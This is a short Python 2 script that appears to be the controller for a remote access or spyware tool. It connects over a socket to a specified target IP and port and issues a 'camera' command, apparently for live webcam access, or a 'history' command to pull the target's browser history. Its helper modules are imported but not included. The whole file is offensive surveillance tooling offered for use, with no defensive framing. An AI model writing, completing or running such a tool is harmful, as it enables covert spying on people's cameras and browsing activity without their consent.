import socket
import optparse
import sys
import threading
import Globals
import camera_control
import browser
#The client read commands ending with \n, otherwise may cause unexpected behavior!!

def create_connection(target_ip, port):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((target_ip, port))
    return soc


def main():
	commands = ['camera', 'history']
	
	parser = optparse.OptionParser(sys.argv[0] + \
		' -T <target ip> -P <target port> -C <command>')
	parser.add_option('-T', dest = 'target_ip', \
		type='string', help = 'Specify target ip')
	parser.add_option('-P', dest = 'target_port', \
		type='string', help = 'Specify target port')
	parser.add_option('-C', dest = 'command', \
		type='string', help = 'Specify command to run against the target.' + str(commands))

	options, args = parser.parse_args()
	Globals.target = options.target_ip
	Globals.tport = options.target_port
	command = options.command

	if None == Globals.target or None == Globals.tport or None == command or command not in commands:
		print parser.usage
		exit(0)

	con = create_connection(Globals.target, int(Globals.tport))
	print con
	if 'camera' == command:
		camera_control.live(con)
	elif 'history' == command:
		browser.get_history(con)

	con.send('end signal\n')
	con.close()


if __name__ == '__main__':
    main()

